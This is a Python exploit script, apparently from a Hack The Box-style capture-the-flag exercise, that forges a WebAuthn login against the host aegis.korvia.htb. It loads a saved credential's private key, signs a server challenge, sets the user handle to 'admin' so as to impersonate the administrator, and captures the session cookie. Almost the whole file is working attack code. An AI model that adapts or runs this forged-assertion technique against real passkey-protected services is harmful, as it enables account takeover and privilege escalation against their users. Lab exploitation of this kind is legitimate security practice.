#!/usr/bin/env python3
import json
import hashlib
import struct
import pickle
import time
import re
import requests
from fido2.utils import websafe_decode, websafe_encode
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import ec

# ============ CONFIGURATION ============
BASE = "http://aegis.korvia.htb:3000"
RP_ID = "aegis.korvia.htb"
ORIGIN = "http://aegis.korvia.htb:3000"
# =======================================

# Load credential
print("[+] Loading credential...")
with open("aegis_cred.pkl", "rb") as f:
    data = pickle.load(f)

priv = serialization.load_pem_private_key(data["priv_pem"], password=None)
cred_id = data["cred_id"]
user_id = data["user_id"]
print(f"[+] Loaded credential for user_id: {user_id.decode()}")

# Create session
s = requests.Session()

# Step 1: Begin authentication
print("[+] Starting WebAuthn authentication...")
r = s.post(
    f"{BASE}/api/v1/auth/webauthn/auth/begin",
    json={"user_id": websafe_encode(user_id)}  # Some servers need this
)
print(f"[+] auth/begin: {r.status_code} {r.text}")
r.raise_for_status()

challenge = websafe_decode(r.json()["challenge"])
print(f"[+] Challenge received: {websafe_encode(challenge)[:20]}...")

# Step 2: Build authenticator data
rp_id_hash = hashlib.sha256(RP_ID.encode()).digest()
flags = 0x01  # UP (User Present)
counter = struct.pack(">I", 3)  # Increment from previous registration

auth_data = rp_id_hash + bytes([flags]) + counter

# Step 3: Build client data
client_data = json.dumps({
    "type": "webauthn.get",
    "challenge": websafe_encode(challenge),
    "origin": ORIGIN,
    "crossOrigin": False,
}, separators=(",", ":")).encode()

# Step 4: Sign the challenge
to_sign = auth_data + hashlib.sha256(client_data).digest()
sig = priv.sign(to_sign, ec.ECDSA(hashes.SHA256()))

# Step 5: Build response body
body = {
    "id": websafe_encode(cred_id),
    "rawId": websafe_encode(cred_id),
    "type": "public-key",
    "response": {
        "clientDataJSON": websafe_encode(client_data),
        "authenticatorData": websafe_encode(auth_data),
        "signature": websafe_encode(sig),
        "userHandle": websafe_encode(b"admin"),
    },
    "clientExtensionResults": {},
}

# Step 6: Complete authentication
print("[+] Sending authentication finish...")
r = s.post(f"{BASE}/api/v1/auth/webauthn/auth/finish", json=body)
print(f"[+] auth/finish: {r.status_code} {r.text}")
r.raise_for_status()

# Step 7: Get session cookie
session_cookie = s.cookies.get('aegis.sid')
if session_cookie:
    print(f"[+] Session cookie obtained: aegis.sid={session_cookie}")
    print("[+] Authentication successful!")
    
    # Optional: Test the session
    print("[+] Testing session...")
    test_r = s.get(f"{BASE}/api/v1/auth/me")
    if test_r.status_code == 200:
        print(f"[+] User info: {test_r.text}")
    else:
        print(f"[!] Session test failed: {test_r.status_code}")
else:
    print("[!] No session cookie received!")
